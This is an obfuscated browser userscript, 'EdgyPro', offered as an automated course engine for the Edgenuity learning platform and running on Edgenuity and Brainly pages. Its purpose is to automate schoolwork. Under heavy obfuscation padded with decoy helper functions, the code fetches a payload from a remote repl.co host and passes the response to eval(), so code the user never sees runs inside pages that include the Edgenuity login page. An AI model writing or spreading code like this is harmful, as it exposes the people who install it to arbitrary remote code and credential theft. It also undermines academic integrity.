// ==UserScript==
// @name         EdgyPro
// @namespace    https://discord.gg/9EgvdJR58U
// @version      BETA
// @description  Automated Course Engine for Edgenuity
// @author       fwtapwater
// @match        *://*.edgenuity.com/*
// @match        *://*.core.learn.edgenuity.com/*
// @match        *://*.core.learn.edgenuity.com/lmsapi/api/pendo/metadata
// @match        *://brainly.in/*
// @match        *://brainly.com/*
// @match        *://brainly.ro/*
// @match        *://brainly.pl/*
// @match        *://brainly.ph/*
// @match        *://media.edgenuity.com/media/*
// @match        *://auth.edgenuity.com/Login/Login/*
// @match        *://emissary.edgenuity.com/*
// @match        https://*.powerspeak.edgenuity.com/*
// @require      https://code.jquery.com/jquery-3.6.4.js
// @require      https://code.jquery.com/ui/1.12.1/jquery-ui.js
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_addValueChangeListener
// @grant        GM_deleteValue
// @grant        GM_xmlhttpRequest
// @connect      chat.openai.com
// @connect      edgenuitybot.frouzk.repl.co
// @connect      core.learn.edgenuity.com
// @run-at       document-end
// @icon         https://cdn.discordapp.com/attachments/1185455102367109120/1185455508136673290/EdgyProLogoBig.png
// ==/UserScript==

var KxAJzO5,_dMMPr,vyD7LN,PLMRA0,B4jyHf,k_wcGcc,uIIPif4,TnYiJy2,SqorEfo,bcqIEh,TkyGD8c,PkeMzz,rIA7ueE,N3_bIJW,Agmu20,XdTmmS;function vlDT_c(_dMMPr){return KxAJzO5[_dMMPr>-0x41?_dMMPr-0x54:_dMMPr<-0x4f?_dMMPr+0x1f:_dMMPr>-0x41?_dMMPr+0x33:_dMMPr>-0x41?_dMMPr-0x1e:_dMMPr<-0x41?_dMMPr>-0x4f?_dMMPr+0x4e:_dMMPr-0x37:_dMMPr-0x63]}KxAJzO5=NhL6U0f.call(this);var evM9rO=[],pyx2BK=vlDT_c(-0x49),LHCZeF=OrDIQvN(()=>{var KxAJzO5=['wo1:U<Vp^Mi&/YDR2OmE','h20:B_+GAVT?]a+lYJN38?A','4GTg16/Hb7+u{*"d','l2<,Y<Qu.U[(rC','hM+,?k;dP#}(z+NTCgdK','Z2|xr2*X9LMKFw|d?R+f:!k0E','TPwJh>A','XPU=>[aC','USRzf7YC','TdD.wnqC','0U.Jg2)MD','}R,0I:|B','8,lHH!(B','.Uv/1nKuG','urFK5+A','YPVKg>;HD','?z.Jf,BZh&Y','?z.Jf,BZgVZ','YPVKg>pND','WPQhM','KEDgg,HB','WP!3M','KEDgg,JB','WPR>c','BE@J','rr@J','l5VKR[9`b1Rz/8:m3a(gX*{YPI[+O9FrzoxgE?N[o!%&:mUoPuVK','YPVKg>SC','=OlH','_zwJ','3oE=v)SC','X}YG+3HHm6Lso7:a{O):D(IC','dPNKi>bT<Ru0byO','Ro(gp@EIFT]a|a7p)zgZh@]{KU','qXc=G?OI7Fw&7m1oKi,<d,<c6!(@DaRn9ZNKm+;pmTu+k^$kZBS="^,?KI!WC9WieP=Ct@8CI!~uN.kLAE(gp@BBV3U'];return pyx2BK?KxAJzO5.pop():pyx2BK++,KxAJzO5},0x0)();function lKjeFR(){try{return global||window||new Function('return this')()}catch(e){try{return this}catch(e){return{}}}}!(_dMMPr=lKjeFR()||{},vyD7LN=_dMMPr.TextDecoder,PLMRA0=_dMMPr.Uint8Array,B4jyHf=_dMMPr.Buffer,k_wcGcc=_dMMPr.String||String,uIIPif4=_dMMPr.Array||Array,TnYiJy2=OrDIQvN(()=>{var _dMMPr=new uIIPif4(0x80),vyD7LN,PLMRA0;!(vyD7LN=k_wcGcc.fromCodePoint||k_wcGcc.fromCharCode,PLMRA0=[]);return OrDIQvN(B4jyHf=>{var uIIPif4,TnYiJy2,SqorEfo,bcqIEh;void(SqorEfo=B4jyHf.length,PLMRA0.length=0x0);for(bcqIEh=0x0;bcqIEh<SqorEfo;){TnYiJy2=B4jyHf[bcqIEh++];if(TnYiJy2<=0x7f){uIIPif4=TnYiJy2}else{if(TnYiJy2<=0xdf){var TkyGD8c=OrDIQvN(B4jyHf=>{return KxAJzO5[B4jyHf<0x3?B4jyHf+0xa:B4jyHf+0x39]},0x1);uIIPif4=(TnYiJy2&0x1f)<<TkyGD8c(-0x7)|B4jyHf[bcqIEh++]&TkyGD8c(-0xa)}else{if(TnYiJy2<=0xef){var PkeMzz=OrDIQvN(B4jyHf=>{return KxAJzO5[B4jyHf<0x45?B4jyHf>0x45?B4jyHf-0x21:B4jyHf-0x38:B4jyHf+0x3]},0x1);uIIPif4=(TnYiJy2&0xf)<<PkeMzz(0x39)|(B4jyHf[bcqIEh++]&vlDT_c(-0x4e))<<0x6|B4jyHf[bcqIEh++]&vlDT_c(-0x4e)}else{if(k_wcGcc.fromCodePoint){var rIA7ueE=OrDIQvN(B4jyHf=>{return KxAJzO5[B4jyHf>-0x20?B4jyHf+0x30:B4jyHf>-0x2e?B4jyHf>-0x2e?B4jyHf<-0x20?B4jyHf<-0x2e?B4jyHf-0x2a:B4jyHf+0x2d:B4jyHf+0x5c:B4jyHf-0x37:B4jyHf+0x53]},0x1);uIIPif4=(TnYiJy2&0x7)<<0x12|(B4jyHf[bcqIEh++]&rIA7ueE(-0x2d))<<rIA7ueE(-0x2c)|(B4jyHf[bcqIEh++]&vlDT_c(-0x4e))<<0x6|B4jyHf[bcqIEh++]&0x3f}else{!(uIIPif4=0x3f,bcqIEh+=0x3)}}}}PLMRA0.push(_dMMPr[uIIPif4]||(_dMMPr[uIIPif4]=vyD7LN(uIIPif4)))}return PLMRA0.join('')},0x1)},0x0)());function JBh9CWk(KxAJzO5){return typeof vyD7LN!==vlDT_c(-0x4c)&&vyD7LN?new vyD7LN().decode(new PLMRA0(KxAJzO5)):typeof B4jyHf!==vlDT_c(-0x4c)&&B4jyHf?B4jyHf.from(KxAJzO5).toString('utf-8'):TnYiJy2(KxAJzO5)}!(SqorEfo=EeMlQF5(0x19),bcqIEh=EeMlQF5(0x10),TkyGD8c={IX1g2eT:EeMlQF5(0xf)},PkeMzz=EeMlQF5(0x9),rIA7ueE=[EeMlQF5(0x8),EeMlQF5(0x9)],N3_bIJW=EeMlQF5.call(vlDT_c(-0x47),vlDT_c(-0x4a)),Agmu20=OrDIQvN(()=>{var KxAJzO5={JrKEeii:0x2c};return KxAJzO5},0x0)());function wQ0HnGA(_dMMPr,vyD7LN){var PLMRA0=OrDIQvN(_dMMPr=>{return KxAJzO5[_dMMPr>-0x4c?_dMMPr+0x4d:_dMMPr>-0x4c?_dMMPr+0x5c:_dMMPr>-0x4c?_dMMPr-0x5e:_dMMPr+0x59]},0x1);switch(XdTmmS){case 0x2c:return _dMMPr*vyD7LN;case 0x1e:return _dMMPr+vyD7LN;case-0xb:return!_dMMPr;case 0x17:return-_dMMPr;case 0x3a:return _dMMPr-vyD7LN;case-PLMRA0(-0x4d):return _dMMPr/vyD7LN}}function fHba4d(KxAJzO5){return KxAJzO5=XdTmmS+(XdTmmS=KxAJzO5,0x0),KxAJzO5}XdTmmS=XdTmmS;function X27RlVd(){var _dMMPr,vyD7LN,PLMRA0,B4jyHf;function k_wcGcc(_dMMPr){return KxAJzO5[_dMMPr<-0x24?_dMMPr>-0x24?_dMMPr+0x3f:_dMMPr<-0x32?_dMMPr-0x24:_dMMPr<-0x32?_dMMPr+0x2b:_dMMPr>-0x32?_dMMPr<-0x24?_dMMPr>-0x32?_dMMPr+0x31:_dMMPr+0x13:_dMMPr+0x4:_dMMPr+0x55:_dMMPr+0xd]}void(_dMMPr=EeMlQF5.call(void 0x0,vlDT_c(-0x4d)),vyD7LN=[EeMlQF5(0xa),EeMlQF5(0xb)],PLMRA0=Object.create(null),B4jyHf=[]);let uIIPif4=EeMlQF5(vlDT_c(-0x4b));const TnYiJy2=0x2a;let SqorEfo=[k_wcGcc(-0x2b),vlDT_c(-0x44),0x3];for(let bcqIEh=0x0;bcqIEh<SqorEfo[N3_bIJW];bcqIEh++)uIIPif4+=SqorEfo[bcqIEh];let TkyGD8c=wQ0HnGA(TnYiJy2,SqorEfo[EeMlQF5(vlDT_c(-0x4a))],XdTmmS=0x2c);return new Agmu20(rIA7ueE[vlDT_c(-0x49)],rIA7ueE[0x1],vyD7LN[vlDT_c(-0x49)]).kpYx1Zt;function Agmu20(uIIPif4,TnYiJy2,SqorEfo){var bcqIEh,Agmu20,rIA7ueE;function N3_bIJW(uIIPif4){return KxAJzO5[uIIPif4<-0x1b?uIIPif4>-0x29?uIIPif4>-0x29?uIIPif4>-0x29?uIIPif4<-0x29?uIIPif4-0x5c:uIIPif4+0x28:uIIPif4+0x31:uIIPif4-0x60:uIIPif4+0x18:uIIPif4-0x5]}!(bcqIEh=[EeMlQF5(0xa)],Agmu20={[EeMlQF5(0x8)]:OrDIQvN(()=>{return TkyGD8c},0x0)},rIA7ueE=rIA7ueE);if(TnYiJy2==PkeMzz){B4jyHf=[]}rIA7ueE=TnYiJy2==vyD7LN[N3_bIJW(-0x22)]?PLMRA0[uIIPif4]||(PLMRA0[uIIPif4]=function(...TnYiJy2){return B4jyHf=TnYiJy2,Agmu20[uIIPif4].call(this,_dMMPr)}):Agmu20[uIIPif4](EeMlQF5.call(k_wcGcc(-0x2a),0xd));return SqorEfo==bcqIEh[vlDT_c(-0x49)]?{kpYx1Zt:rIA7ueE}:rIA7ueE}}class dLzVgV{constructor(){void(this.property1=EeMlQF5(0xe),this.property2=3.14)}[TkyGD8c.IX1g2eT](){return wQ0HnGA(this[bcqIEh],this[EeMlQF5(0x11)],XdTmmS=0x1e)}[EeMlQF5(0x12)](){var _dMMPr,vyD7LN;function PLMRA0(_dMMPr){return KxAJzO5[_dMMPr>-0x15?_dMMPr<-0x15?_dMMPr-0x48:_dMMPr<-0x7?_dMMPr>-0x15?_dMMPr>-0x7?_dMMPr-0x44:_dMMPr<-0x7?_dMMPr>-0x7?_dMMPr-0x2e:_dMMPr>-0x15?_dMMPr+0x14:_dMMPr+0x5a:_dMMPr-0x42:_dMMPr+0x23:_dMMPr-0x1:_dMMPr-0x2]}void(_dMMPr=EeMlQF5(0x18),vyD7LN=[EeMlQF5(0x14),EeMlQF5.apply(PLMRA0(-0xd),[0x15])]);const B4jyHf={[EeMlQF5(0x13)]:vyD7LN[0x0],[vyD7LN[PLMRA0(-0xe)]]:EeMlQF5(0x16)};return Object[EeMlQF5(0x17)](B4jyHf)[_dMMPr](_dMMPr=>B4jyHf[_dMMPr])}}if(window===window[SqorEfo]){var C1vhqY,uXDd9_z;function IBqFK2(_dMMPr){return KxAJzO5[_dMMPr>0x19?_dMMPr-0x63:_dMMPr>0xb?_dMMPr>0xb?_dMMPr<0xb?_dMMPr-0x4b:_dMMPr>0x19?_dMMPr-0x1c:_dMMPr<0x19?_dMMPr<0xb?_dMMPr-0x62:_dMMPr>0xb?_dMMPr>0x19?_dMMPr+0x4:_dMMPr-0xc:_dMMPr+0x3f:_dMMPr-0x4b:_dMMPr+0x5a:_dMMPr-0x5]}void(C1vhqY=EeMlQF5(0x21),uXDd9_z=EeMlQF5(IBqFK2(0x15)),OrDIQvN(()=>{var _dMMPr=EeMlQF5(0x1a),vyD7LN;typeof(vyD7LN=OrDIQvN((_dMMPr,vyD7LN)=>{var PLMRA0=EeMlQF5.call(void 0x0,0x1c);GM_xmlhttpRequest({[EeMlQF5(0x1b)]:PLMRA0,[EeMlQF5.apply(void 0x0,[0x1d])]:_dMMPr,[uXDd9_z]:OrDIQvN(_dMMPr=>{var PLMRA0;function B4jyHf(_dMMPr){return KxAJzO5[_dMMPr>-0x56?_dMMPr-0x53:_dMMPr<-0x64?_dMMPr+0x2e:_dMMPr<-0x64?_dMMPr-0x5f:_dMMPr>-0x56?_dMMPr-0x2c:_dMMPr<-0x64?_dMMPr-0x48:_dMMPr+0x63]}PLMRA0=B4jyHf(-0x5b);if(PLMRA0&&Agmu20.JrKEeii>-0x2a){var k_wcGcc=OrDIQvN(_dMMPr=>{const PLMRA0={};for(let B4jyHf of _dMMPr.replace(/[^w]/g,'').toLowerCase())PLMRA0[B4jyHf]=wQ0HnGA(PLMRA0[B4jyHf],0x1,XdTmmS=0x1e)||vlDT_c(-0x48);return PLMRA0},0x1);function uIIPif4(_dMMPr,PLMRA0){const k_wcGcc=buildCharMap(_dMMPr),uIIPif4=buildCharMap(PLMRA0);for(let TnYiJy2 in k_wcGcc)if(k_wcGcc[TnYiJy2]!==uIIPif4[TnYiJy2]){return!0x1}if(Object.keys(k_wcGcc).length!==Object.keys(uIIPif4).length){return B4jyHf(-0x5b)}return!0x0}function TnYiJy2(_dMMPr){const PLMRA0=SqorEfo(_dMMPr);return PLMRA0!==0x1/0x0}function SqorEfo(_dMMPr){var PLMRA0=OrDIQvN(_dMMPr=>{return KxAJzO5[_dMMPr<0x38?_dMMPr+0x10:_dMMPr>0x46?_dMMPr+0x23:_dMMPr<0x38?_dMMPr-0x49:_dMMPr-0x39]},0x1);if(wQ0HnGA(_dMMPr,fHba4d(-0xb))){return wQ0HnGA(0x1,fHba4d(0x17))}const B4jyHf=SqorEfo(_dMMPr.left),k_wcGcc=SqorEfo(_dMMPr.right),uIIPif4=Math.abs(wQ0HnGA(B4jyHf,k_wcGcc,fHba4d(IBqFK2(0x17))));if((B4jyHf===0x1/0x0||k_wcGcc===0x1/0x0||uIIPif4>PLMRA0(0x3f))&&Agmu20.JrKEeii>-0x2a){return 0x1/0x0}const TnYiJy2=wQ0HnGA(Math.max(B4jyHf,k_wcGcc),0x1,XdTmmS=IBqFK2(0x15));return TnYiJy2}window[EeMlQF5(0x1f)]={buildCharacterMap,isAnagrams,isBalanced,getHeightBalanced}}vyD7LN(_dMMPr[EeMlQF5(0x20)])},0x1)})},0x2),vyD7LN(_dMMPr,OrDIQvN(_dMMPr=>{var vyD7LN=vlDT_c(-0x46);if(vyD7LN){var PLMRA0=OrDIQvN(_dMMPr=>{var vyD7LN,PLMRA0,B4jyHf,k_wcGcc,uIIPif4,TnYiJy2,SqorEfo,bcqIEh,TkyGD8c,PkeMzz,rIA7ueE;function N3_bIJW(_dMMPr){return KxAJzO5[_dMMPr>0x7?_dMMPr-0x8:_dMMPr-0x2e]}vyD7LN=_dMMPr.length;if(vyD7LN<IBqFK2(0x16)){return IBqFK2(0x11)}!(PLMRA0=Math.max(..._dMMPr),B4jyHf=Math.min(..._dMMPr));if(PLMRA0===B4jyHf){return 0x0}typeof(k_wcGcc=Array(wQ0HnGA(vyD7LN,0x1,fHba4d(IBqFK2(0x17)))).fill(Number.MAX_SAFE_INTEGER),uIIPif4=Array(wQ0HnGA(vyD7LN,IBqFK2(0x12),fHba4d(0x3a))).fill(Number.MIN_SAFE_INTEGER),TnYiJy2=Math.ceil(wQ0HnGA(PLMRA0-B4jyHf,vyD7LN-IBqFK2(0x12),fHba4d(-0x2d))),SqorEfo=0x0);for(bcqIEh=0x0;bcqIEh<vyD7LN;bcqIEh++){if(_dMMPr[bcqIEh]===B4jyHf||_dMMPr[bcqIEh]===PLMRA0){continue}typeof(SqorEfo=Math.floor(wQ0HnGA(_dMMPr[bcqIEh]-B4jyHf,TnYiJy2,XdTmmS=-vlDT_c(-0x42))),k_wcGcc[SqorEfo]=Math.min(k_wcGcc[SqorEfo],_dMMPr[bcqIEh]),uIIPif4[SqorEfo]=Math.max(uIIPif4[SqorEfo],_dMMPr[bcqIEh]))}typeof(TkyGD8c=Number.MIN_SAFE_INTEGER,PkeMzz=B4jyHf);for(rIA7ueE=N3_bIJW(0xd);rIA7ueE<vyD7LN-0x1;rIA7ueE++){if(k_wcGcc[rIA7ueE]===Number.MAX_SAFE_INTEGER&&uIIPif4[rIA7ueE]===Number.MIN_SAFE_INTEGER){continue}void(TkyGD8c=Math.max(TkyGD8c,wQ0HnGA(k_wcGcc[rIA7ueE],PkeMzz,XdTmmS=0x3a)),PkeMzz=uIIPif4[rIA7ueE])}return TkyGD8c=Math.max(TkyGD8c,wQ0HnGA(PLMRA0,PkeMzz,XdTmmS=0x3a)),TkyGD8c},0x1);console.log(PLMRA0)}if(_dMMPr==C1vhqY){alert(EeMlQF5(0x22))}else{eval(_dMMPr)}},0x1)))},0x0)())}function fdPAFj(_dMMPr){var vyD7LN=OrDIQvN(_dMMPr=>{return KxAJzO5[_dMMPr<-0x2c?_dMMPr+0x13:_dMMPr>-0x2c?_dMMPr>-0x1e?_dMMPr-0x14:_dMMPr<-0x1e?_dMMPr+0x2b:_dMMPr-0x9:_dMMPr+0x61]},0x1);const PLMRA0='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~"',B4jyHf=''+(_dMMPr||''),k_wcGcc=B4jyHf.length,uIIPif4=[];let TnYiJy2=vyD7LN(-0x26),SqorEfo=0x0,bcqIEh=-vyD7LN(-0x25);for(let TkyGD8c=0x0;TkyGD8c<k_wcGcc;TkyGD8c++){const PkeMzz=PLMRA0.indexOf(B4jyHf[TkyGD8c]);if(PkeMzz===-vyD7LN(-0x25)){continue}if(bcqIEh<vlDT_c(-0x49)){bcqIEh=PkeMzz}else{void(bcqIEh+=PkeMzz*0x5b,TnYiJy2|=bcqIEh<<SqorEfo,SqorEfo+=(bcqIEh&0x1fff)>0x58?0xd:0xe);do{typeof(uIIPif4.push(TnYiJy2&0xff),TnYiJy2>>=0x8,SqorEfo-=0x8)}while(SqorEfo>0x7);bcqIEh=-0x1}}if(bcqIEh>-0x1){uIIPif4.push((TnYiJy2|bcqIEh<<SqorEfo)&0xff)}return JBh9CWk(uIIPif4)}function EeMlQF5(KxAJzO5,_dMMPr,vyD7LN,PLMRA0=fdPAFj,B4jyHf=evM9rO){if(vyD7LN){return _dMMPr[evM9rO[vyD7LN]]=EeMlQF5(KxAJzO5,_dMMPr)}else{if(_dMMPr){[B4jyHf,_dMMPr]=[PLMRA0(B4jyHf),KxAJzO5||vyD7LN]}}return _dMMPr?KxAJzO5[B4jyHf[_dMMPr]]:evM9rO[KxAJzO5]||(vyD7LN=(B4jyHf[KxAJzO5],PLMRA0),evM9rO[KxAJzO5]=vyD7LN(LHCZeF[KxAJzO5]))}function NhL6U0f(){return[0x3f,0xc,'undefined',0x6,0x7,0x0,0x1,void 0x0,!0x1,0x1e,0x2,0x3a,0x2d]}function OrDIQvN(KxAJzO5,_dMMPr){var vyD7LN=function(){return KxAJzO5(...arguments)};Object['defineProperty'](vyD7LN,'length',{'value':_dMMPr,'configurable':true});return vyD7LN}
